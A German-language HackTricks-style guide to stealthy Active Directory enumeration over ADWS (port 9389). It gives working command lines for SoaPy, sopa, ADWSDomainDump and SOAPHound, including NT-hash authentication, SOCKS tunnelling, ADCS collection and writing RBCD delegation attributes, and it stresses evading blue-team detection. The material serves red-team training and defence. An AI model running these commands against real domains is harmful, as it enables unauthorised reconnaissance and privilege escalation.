# Active Directory Web Services (ADWS)-Enumeration & unauffällige Datensammlung

{{#include ../../banners/hacktricks-training.md}}

## Was ist ADWS?

Active Directory Web Services (ADWS) ist **seit Windows Server 2008 R2 standardmäßig auf jedem Domain Controller aktiviert** und lauscht auf TCP-Port **9389**. Trotz des Namens kommt **kein HTTP zum Einsatz**. Stattdessen stellt der Dienst LDAP-artige Daten über einen Stack proprietärer .NET-Framing-Protokolle bereit:<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Da der Datenverkehr in diesen binären SOAP-Frames gekapselt ist und über einen ungewöhnlichen Port läuft, wird **eine Enumeration über ADWS viel seltener untersucht, gefiltert oder anhand von Signaturen erkannt als klassischer LDAP-Datenverkehr über Port 389 und 636**. Für Operatoren bedeutet das:<sup>[[1]](#references)[[7]](#references)</sup>

* Unauffälligeres Recon – Blue Teams konzentrieren sich oft auf LDAP-Abfragen.
* Daten können auch von **Nicht-Windows-Hosts (Linux, macOS)** über einen SOCKS-Proxy-Tunnel durch Port 9389/TCP gesammelt werden.
* Dieselben Daten, die du über LDAP erhalten würdest (Benutzer, Gruppen, ACLs, Schema usw.), sowie die Möglichkeit, **Schreibvorgänge** auszuführen (z. B. `msDs-AllowedToActOnBehalfOfOtherIdentity` für **RBCD**).

ADWS-Interaktionen basieren auf WS-Enumeration: Jede Abfrage beginnt mit einer `Enumerate`-Nachricht, die den LDAP-Filter und die Attribute definiert und eine `EnumerationContext`-GUID zurückgibt. Darauf folgen eine oder mehrere `Pull`-Nachrichten, die Ergebnisse bis zum vom Server festgelegten Limit übertragen.<sup>[[7]](#references)</sup> Kontexte laufen nach etwa 30 Minuten ab. Daher muss das Tooling Ergebnisse seitenweise abrufen oder Filter aufteilen (Präfixabfragen pro CN), um den Verlust des Status zu vermeiden.<sup>[[8]](#references)</sup> Wenn Sicherheitsdeskriptoren angefordert werden, muss das Control `LDAP_SERVER_SD_FLAGS_OID` angegeben werden, damit SACLs ausgelassen werden. Andernfalls lässt ADWS das Attribut `nTSecurityDescriptor` einfach aus seiner SOAP-Antwort weg.

> HINWEIS: ADWS wird auch von vielen RSAT-GUI- und PowerShell-Tools verwendet, sodass sich der Datenverkehr mit legitimer Admin-Aktivität vermischen kann.

## SoaPy – nativer Python-Client

[SoaPy](https://github.com/logangoins/soapy) ist eine **vollständige Neuimplementierung des ADWS-Protokollstacks in reinem Python**. Es erstellt die NBFX/NBFSE/NNS/NMF-Frames bytegenau und ermöglicht so die Datensammlung von Unix-ähnlichen Systemen, ohne die .NET-Runtime zu verwenden.<sup>[[1]](#references)[[2]](#references)</sup>

### Hauptfunktionen

* Unterstützt **Proxying über SOCKS** (nützlich von C2-Implants aus).
* Detaillierte Suchfilter, identisch mit LDAP `-q '(objectClass=user)'`.
* Optionale **Schreibvorgänge** (`--set` / `--delete`).
* **BOFHound-Ausgabemodus** für den direkten Import in BloodHound.<sup>[[3]](#references)</sup>
* `--parse`-Flag zum Aufbereiten von Zeitstempeln und `userAccountControl`, wenn bessere Lesbarkeit erforderlich ist.<sup>[[2]](#references)</sup>

### Gezielte Erfassungs-Flags und Schreibvorgänge

SoaPy bietet kuratierte Schalter, die gängige LDAP-Hunting-Aufgaben über ADWS nachbilden: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds` sowie die rohen Optionen `--query` / `--filter` für benutzerdefinierte Abfragen. Dazu kommen Schreibprimitive wie `--rbcd <source>` (setzt `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (SPN-Staging für gezieltes Kerberoasting) und `--asrep` (setzt `DONT_REQ_PREAUTH` in `userAccountControl`).<sup>[[2]](#references)</sup>

Beispiel für eine gezielte SPN-Suche, die nur `samAccountName` und `servicePrincipalName` zurückgibt:

```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
      --spns -f samAccountName,servicePrincipalName --parse
```

Verwende denselben Host/dieselben Zugangsdaten, um die gefundenen Schwachstellen sofort auszunutzen: Liste mit `--rbcds` Objekte auf, die RBCD unterstützen, und führe dann `--rbcd 'WEBSRV01$' --account 'FILE01$'` aus, um eine Resource-Based Constrained Delegation-Kette einzurichten (den vollständigen Angriffsweg findest du unter [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

### Installation (Operator-Host)

```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```

## ADWSDomainDump – LDAPDomainDump über ADWS (Linux/Windows)

* Fork von `ldapdomaindump`, der LDAP-Abfragen durch ADWS-Aufrufe über TCP/9389 ersetzt, um LDAP-Signature-Treffer zu reduzieren.
* Führt zunächst eine Erreichbarkeitsprüfung für Port 9389 durch, sofern nicht `--force` übergeben wird (überspringt die Prüfung, wenn Portscans auffällig oder gefiltert sind).
* Laut README mit Microsoft Defender for Endpoint und CrowdStrike Falcon getestet und erfolgreich umgangen.<sup>[[4]](#references)</sup>

### Installation

```bash
pipx install .
```

### Verwendung

```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```

Die typische Ausgabe protokolliert die Erreichbarkeitsprüfung für Port 9389, den ADWS-Bind und den Start sowie Abschluss des Dumps:

```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

## Sopa – Ein praktischer Client für ADWS in Golang

Ähnlich wie soapy implementiert [sopa](https://github.com/Macmod/sopa) den ADWS-Protokollstack (MS-NNS + MC-NMF + SOAP) in Golang und stellt Kommandozeilen-Flags bereit, um ADWS-Aufrufe wie die folgenden auszuführen:<sup>[[5]](#references)</sup>

* **Objektsuche und -abruf** – `query` / `get`
* **Objektlebenszyklus** – `create [user|computer|group|ou|container|custom]` und `delete`
* **Attributbearbeitung** – `attr [add|replace|delete]`
* **Kontoverwaltung** – `set-password` / `change-password`
* und weitere wie `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]` usw.

### Highlights der Protokollzuordnung

* LDAP-artige Suchen werden über **WS-Enumeration** (`Enumerate` + `Pull`) ausgeführt – mit Attributprojektion, Bereichssteuerung (Base/OneLevel/Subtree) und Paginierung.
* Der Abruf eines einzelnen Objekts verwendet **WS-Transfer** `Get`; Attributänderungen verwenden `Put`, Löschungen verwenden `Delete`.
* Die integrierte Objekterstellung verwendet **WS-Transfer ResourceFactory**; benutzerdefinierte Objekte verwenden ein **IMDA AddRequest**, das über YAML-Vorlagen gesteuert wird.
* Passwortoperationen sind **MS-ADCAP**-Aktionen (`SetPassword`, `ChangePassword`).<sup>[[5]](#references)</sup>

### Nicht authentifizierte Metadatenerkennung (mex)

ADWS stellt WS-MetadataExchange ohne Zugangsdaten bereit. So lässt sich die Erreichbarkeit schnell überprüfen, bevor man sich authentifiziert:<sup>[[5]](#references)</sup>

```bash
sopa mex --dc <DC>
```

### Hinweise zur DNS/DC-Erkennung und zum Kerberos-Targeting

Sopa kann DCs über SRV-Einträge auflösen, wenn `--dc` weggelassen und `--domain` angegeben wird. Es fragt in dieser Reihenfolge ab und verwendet das Ziel mit der höchsten Priorität:<sup>[[5]](#references)</sup>

```text
_ldap._tcp.<domain>
_kerberos._tcp.<domain>
```

Operativ empfiehlt es sich, einen vom DC kontrollierten Resolver zu verwenden, um Fehler in segmentierten Umgebungen zu vermeiden:

* Verwende `--dns <DC-IP>`, damit **alle** SRV-/PTR-/Forward-Lookups über den DC-DNS laufen.
* Verwende `--dns-tcp`, wenn UDP blockiert ist oder die SRV-Antworten groß sind.
* Wenn Kerberos aktiviert ist und `--dc` eine IP-Adresse ist, führt sopa eine **Reverse-PTR-Abfrage** durch, um einen FQDN für das korrekte SPN-/KDC-Targeting zu ermitteln. Wenn Kerberos nicht verwendet wird, erfolgt keine PTR-Abfrage.

Beispiel (IP + Kerberos, DNS-Abfragen erzwungen über den DC):

```bash
sopa info version --dc 192.168.1.10 --dns 192.168.1.10 -k --domain corp.local -u user -p pass
```

### Optionen für Authentifizierungsmaterial

Neben Klartextpasswörtern unterstützt sopa **NT hashes**, **Kerberos AES keys**, **ccache** und **PKINIT certificates** (PFX oder PEM) für die ADWS-Authentifizierung. Bei Verwendung von `--aes-key`, `-c` (ccache) oder zertifikatsbasierten Optionen wird Kerberos automatisch verwendet.<sup>[[5]](#references)</sup>

```bash
# NT hash
sopa --dc <DC> -d <DOMAIN> -u <USER> -H <NT_HASH> query --filter '(objectClass=user)'

# Kerberos ccache
sopa --dc <DC> -d <DOMAIN> -u <USER> -c <CCACHE> info domain
```

### Erstellung benutzerdefinierter Objekte über Templates

Für beliebige Objektklassen verarbeitet der Befehl `create custom` ein YAML-Template, das einer IMDA-`AddRequest` entspricht:<sup>[[5]](#references)</sup>

* `parentDN` und `rdn` definieren den Container und den relativen DN.
* `attributes[].name` unterstützt `cn` oder den namespaced Eintrag `addata:cn`.
* `attributes[].type` akzeptiert `string|int|bool|base64|hex` oder explizite `xsd:*`-Werte.
* **Füge** `ad:relativeDistinguishedName` oder `ad:container-hierarchy-parent` **nicht hinzu**; sopa fügt sie ein.
* `hex`-Werte werden in `xsd:base64Binary` umgewandelt; verwende `value: ""`, um leere Strings festzulegen.

## SOAPHound – ADWS-Sammlung mit hohem Volumen (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) ist ein .NET-Collector, der alle LDAP-Interaktionen innerhalb von ADWS hält und mit BloodHound v4 kompatible JSON-Dateien ausgibt. Er erstellt einmalig einen vollständigen Cache aus `objectSid`, `objectGUID`, `distinguishedName` und `objectClass` (`--buildcache`) und verwendet ihn anschließend für umfangreiche `--bhdump`-, `--certdump`- (ADCS) oder `--dnsdump`-Durchläufe (AD-integriertes DNS), sodass nur etwa 35 kritische Attribute den DC verlassen. AutoSplit (`--autosplit --threshold <N>`) unterteilt Abfragen automatisch nach CN-Präfix, damit bei großen Forests das 30-Minuten-Timeout des EnumerationContext nicht überschritten wird.<sup>[[8]](#references)</sup>

Typischer Workflow auf einer domänengebundenen Operator-VM:

```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
              --autosplit --threshold 1200 --nolaps \
              -o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```

Exportierte JSON-Slots lassen sich direkt in SharpHound-/BloodHound-Workflows einbinden – siehe [BloodHound methodology](bloodhound.md) für Ideen zur nachgelagerten Graphdarstellung. AutoSplit macht SOAPHound auch in Forests mit mehreren Millionen Objekten zuverlässig und hält dabei die Abfrageanzahl niedriger als bei ADExplorer-ähnlichen Snapshots.

## Stealth-AD-Erfassungsworkflow

Der folgende Workflow zeigt, wie du **Domain- und ADCS-Objekte** über ADWS enumerierst, sie in BloodHound-JSON umwandelst und nach zertifikatbasierten Angriffspfaden suchst – alles von Linux aus:

1. **Tunnel 9389/TCP** vom Zielnetzwerk zu deinem Rechner (z. B. über Chisel, Meterpreter, SSH Dynamic Port Forwarding usw.). Exportiere `export HTTPS_PROXY=socks5://127.0.0.1:1080` oder verwende bei SoaPy `--proxyHost/--proxyPort`.

2. **Erfasse das Root-Domain-Objekt:**

```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
      -q '(objectClass=domain)' \
      | tee data/domain.log
```

3. **ADCS-bezogene Objekte aus dem Configuration NC sammeln:**

```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
      -dn 'CN=Configuration,DC=ludus,DC=domain' \
      -q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
           (objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
      | tee data/adcs.log
```

4. **In BloodHound konvertieren:**

```bash
bofhound -i data --zip   # produces BloodHound.zip
```

5. **Lade die ZIP-Datei** in die BloodHound-GUI hoch und führe Cypher-Abfragen wie `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` aus, um Zertifikats-Eskalationspfade (ESC1, ESC8 usw.) aufzudecken.

### Schreiben von `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)

```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
      --set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
      msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```

Kombiniere dies mit `s4u2proxy`/`Rubeus /getticket` zu einer vollständigen **Resource-Based Constrained Delegation**-Kette (siehe [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## Tooling Summary

| Zweck | Tool | Hinweise |
|---------|------|-------|
| ADWS-Aufzählung | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, Lesen/Schreiben |
| ADWS-Dump mit hohem Volumen | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, Cache-first, BH/ADCS/DNS-Modi |
| BloodHound-Import | [BOFHound](https://github.com/bohops/BOFHound) | Konvertiert SoaPy-/ldapsearch-Protokolle |
| Zertifikatskompromittierung | [Certipy](https://github.com/ly4k/Certipy) | Kann über denselben SOCKS-Proxy geleitet werden |
| ADWS-Aufzählung und Objektänderungen | [sopa](https://github.com/Macmod/sopa) | Generischer Client zur Kommunikation mit bekannten ADWS-Endpunkten – ermöglicht Aufzählung, Objekterstellung, Attributänderungen und Passwortänderungen |

## References

- [1] [SpecterOps – SOAP(y) richtig einsetzen – Ein Leitfaden für Operatoren zur unauffälligen AD-Erfassung mit ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
- [2] [SoaPy auf GitHub](https://github.com/logangoins/soapy)
- [3] [BOFHound auf GitHub](https://github.com/bohops/BOFHound)
- [4] [ADWSDomainDump auf GitHub](https://github.com/mverschu/adwsdomaindump)
- [5] [Sopa auf GitHub](https://github.com/Macmod/sopa)
- [6] [Microsoft – Spezifikationen MC-NBFX, MC-NBFSE, MS-NNS und MC-NMF](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
- [7] [IBM X-Force Red – Unauffällige Aufzählung von Active-Directory-Umgebungen über ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
- [8] [FalconForce – SOAPHound-Tool zur Erfassung von Active-Directory-Daten über ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)
{{#include ../../banners/hacktricks-training.md}}
